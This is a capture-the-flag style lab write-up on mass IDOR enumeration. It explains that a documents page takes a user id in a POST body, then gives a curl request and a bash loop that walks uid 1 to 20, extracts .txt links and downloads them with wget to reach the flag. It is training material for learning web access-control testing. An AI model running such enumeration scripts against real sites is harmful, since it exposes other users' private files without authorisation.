# Mass IDOR Enumeration

#### Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.

If you followed along the section, you are probably trying to get the `uid` parameter from the URL.

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

The `uid` parameter is actually been sent in the POST Request. You can confirm this in the inspect element or intercept the Request with Burp Suite.

Since we have the POST data lets try to use curl with the following command to get the html code.

{% code overflow="wrap" %}
```bash
curl -s  'http://SERVER_IP:SERVER_PORT/documents.php' --data-raw 'uid=1'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

We get the filenames in the HTML. Now we need to found a way to automate this process and get only .txt matches:

{% code overflow="wrap" %}
```bash
#!/bin/bash

url="http://SERVER_IP:SERVER_PORT"

for i in {1..20}; do
        for link in $(curl -s "$url/documents.php" --data-raw "uid=$i" | grep -oP "\/documents\/[^'\" ]*?\.txt"); do
        	wget -q $url/$link
        done
done

```
{% endcode %}

Here is a breakdown for the script:

* **Define URL**:
  * Set the variable `url` to `http://SERVER_IP:SERVER_PORT`.
* **Outer Loop**:
  * Iterate `i` from 1 to 20.
* **Inner Loop**:
  * Use `curl` to send a POST request to `documents.php` with `uid=$i`:
    * `-s` option makes `curl` silent (no progress or error messages).
  * Pipe the response to `grep` to find links to `.txt` files:
    * **Regex Used**: `\/documents\/[^'\" ]*?\.txt`
      * `\/documents\/`: Matches the string `/documents/`.
      * `[^'\" ]*?`: Matches any characters that are not a single quote, double quote, or space (non-greedy).
      * `\.txt`: Matches the string `.txt` at the end.
* **Download Files**:
  * For each extracted link, use `wget` to download the file from the constructed URL (`$url/$link`):
    * `-q` option makes `wget` quiet (no output).
* **End of Loops**:
  * Close both the inner and outer loops.



<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

And we got a match! When we open this .txt file we can see indeed that it is our flag!
